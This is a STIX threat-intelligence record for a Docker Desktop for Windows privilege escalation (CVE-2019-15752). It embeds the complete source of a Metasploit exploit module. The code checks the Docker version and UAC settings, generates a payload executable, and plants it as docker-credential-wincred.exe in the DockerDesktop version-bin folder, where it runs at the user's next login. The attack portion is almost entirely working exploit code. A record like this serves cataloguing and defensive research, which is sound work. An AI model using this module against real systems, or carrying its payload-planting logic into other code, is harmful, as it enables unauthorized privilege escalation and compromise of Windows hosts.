{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4523539f-bcb6-44c3-a899-76ee80b50ec2",
    "created": "2024-08-14T16:49:47.892024Z",
    "modified": "2024-08-14T16:49:47.892028Z",
    "name": "Docker-Credential-Wincred.exe Privilege Escalation",
    "description": " This exploit leverages a vulnerability in docker desktop community editions prior to 2.1.0.1 where an attacker can write a payload to a lower-privileged area to be executed automatically by the docker user at login.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/docker_credential_wincred.rb",
            "external_id": "docker_credential_wincred.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-15752"
        },
        {
            "source_name": "reference",
            "url": "https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ManualRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Post::Windows::Priv\n  include Post::Windows::Runas\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Docker-Credential-Wincred.exe Privilege Escalation',\n        'Description' => %q{\n          This exploit leverages a vulnerability in docker desktop\n          community editions prior to 2.1.0.1 where an attacker can write\n          a payload to a lower-privileged area to be executed\n          automatically by the docker user at login.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Morgan Roman', # discovery\n          'bwatters-r7', # metasploit module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [[ 'Automatic', {} ]],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'WfsDelay' => 15\n        },\n        'DisclosureDate' => '2019-07-05',\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ]\n        },\n        'References' => [\n          ['CVE', '2019-15752'],\n          ['URL', 'https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e']\n        ]\n      )\n    )\n    register_options(\n      [OptString.new('PROGRAMDATA', [true, 'Path to docker version-bin.', '%PROGRAMDATA%'])]\n    )\n  end\n\n  def docker_version\n    output = cmd_exec('cmd.exe', '/c docker -v')\n    vprint_status(output)\n    version_string = output.match(/version (\\d+\\.\\d+\\.\\d)/)[1]\n    Rex::Version.new(version_string.split('.').map(&:to_i).join('.'))\n  end\n\n  def check\n    if docker_version <= Rex::Version.new('18.09.0')\n      return CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    check_permissions!\n    case get_uac_level\n    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,\n      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,\n      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT\n      fail_with(Failure::NotVulnerable,\n                \"UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...\")\n    when UAC_DEFAULT\n      print_good('UAC is set to Default')\n      print_good('BypassUAC can bypass this setting, continuing...')\n    when UAC_NO_PROMPT\n      print_warning('UAC set to DoNotPrompt - using ShellExecute \"runas\" method instead')\n      shell_execute_exe\n      return\n    end\n\n    # make payload\n    docker_path = expand_path(\"#{datastore['PROGRAMDATA']}\\\\DockerDesktop\\\\version-bin\")\n    fail_with(Failure::NotFound, 'Vulnerable Docker path is not on system') unless directory?(docker_path)\n    payload_name = 'docker-credential-wincred.exe'\n    payload_pathname = \"#{docker_path}\\\\#{payload_name}\"\n    vprint_status('Making Payload')\n    payload = generate_payload_exe\n\n    # upload Payload\n    vprint_status(\"Uploading Payload to #{payload_pathname}\")\n    write_file(payload_pathname, payload)\n    vprint_status('Payload Upload Complete')\n    print_status('Waiting for user to attempt to login')\n  end\n\n  def check_permissions!\n    unless check == Exploit::CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')\n    end\n    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?\n    # Check if you are an admin\n    # is_in_admin_group can be nil, true, or false\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-07-05",
    "x_mitre_platforms": [
        "['win']"
    ]
}